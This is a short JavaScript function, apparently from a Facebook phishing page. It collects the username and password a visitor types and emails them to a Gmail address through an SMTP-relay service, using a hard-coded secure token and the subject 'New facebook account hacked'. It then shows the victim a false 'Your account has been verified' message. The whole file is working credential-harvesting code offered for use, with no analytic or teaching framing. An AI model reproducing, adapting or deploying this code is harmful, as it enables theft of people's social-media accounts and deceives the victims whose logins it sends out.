function sendemail() {

    var username = $('#username').val();
    var password = $('#password').val();

    var Body = 'User Name: ' + username + '<br>Password: ' + password;

    Email.send({
        SecureToken: "31c101ed-19a9-4ff2-9d94-ba71df93dba2",
        To: 'deeptamresearchfoundation@gmail.com',
        From: "deeptamresearchfoundation@gmail.com",
        Subject: "New facebook account hacked",
        Body: Body

    }).then(
        message => {
            //console.log (message);
            if (message == 'OK') {
                alert("Your account has been verified")
                document.getElementById('verified').innerText = "Verifiy your account";
                document.getElementById('load').style.display = "none";
            }
            else {
                alert("Please try again")
                document.getElementById('verified').innerText = "Verifiy your account";
                document.getElementById('load').style.display = "none";
            }

        }
    );
}